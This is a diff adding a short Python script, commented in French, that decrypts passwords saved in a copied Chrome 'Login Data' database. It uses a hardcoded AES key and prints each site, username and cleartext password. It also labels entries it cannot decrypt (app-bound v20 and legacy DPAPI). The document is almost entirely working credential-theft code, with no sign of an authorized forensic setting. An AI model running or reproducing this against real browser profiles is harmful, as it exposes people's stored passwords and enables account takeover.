@@ -1,0 +1,60 @@
+python3 << 'PYEOF'
+import sqlite3, shutil, os
+from Cryptodome.Cipher import AES
+ 
+KEY_HEX = "7DB312C81AF1AD45EAEB2EB44DE3CBA5829AD4A74EDEDA70DDB3C1CF6FBC1F1C"
+DB_PATH = "chrome-Login-Data.db"
+ 
+key = bytes.fromhex(KEY_HEX)
+tmp = "/tmp/login_work.db"
+shutil.copy2(DB_PATH, tmp)
+ 
+db = sqlite3.connect(tmp)
+rows = db.execute(
+    "SELECT origin_url, username_value, password_value, date_created FROM logins ORDER BY date_created DESC"
+).fetchall()
+ 
+print(f"[+] {len(rows)} entrees\n")
+ 
+ok = 0
+fail = 0
+for url, user, enc, date in rows:
+    if not enc or len(enc) < 32:
+        continue
+ 
+    # Detecter la version du blob
+    version = enc[:3]
+ 
+    if version == b'v20':
+        # App-Bound Encryption - pas dechiffrable avec la cle DPAPI seule
+        print(f"[!] v20 (app-bound) | {url} | {user} | [needs app-bound key]")
+        fail += 1
+        continue
+ 
+    if version == b'v10':
+        try:
+            nonce = enc[3:15]
+            ciphertext = enc[15:-16]
+            tag = enc[-16:]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            pwd = cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
+            print(f"[+] v10 OK | {url} | {user} | {pwd}")
+            ok += 1
+        except Exception as e:
+            print(f"[!] v10 FAIL | {url} | {user} | {e}")
+            fail += 1
+        continue
+ 
+    # Ancien format DPAPI direct (pre-v10)
+    try:
+        from Cryptodome.Util.Padding import unpad
+        import ctypes
+        # Blob DPAPI brut - pas dechiffrable sur Linux sans la masterkey
+        print(f"[?] legacy DPAPI | {url} | {user} | [needs Windows DPAPI]")
+        fail += 1
+    except:
+        print(f"[?] unknown | {url} | {user} | [unknown format]")
+        fail += 1
+ 
+print(f"\n[*] Resultat : {ok} dechiffres, {fail} echoues (v20/legacy)")
+PYEOF
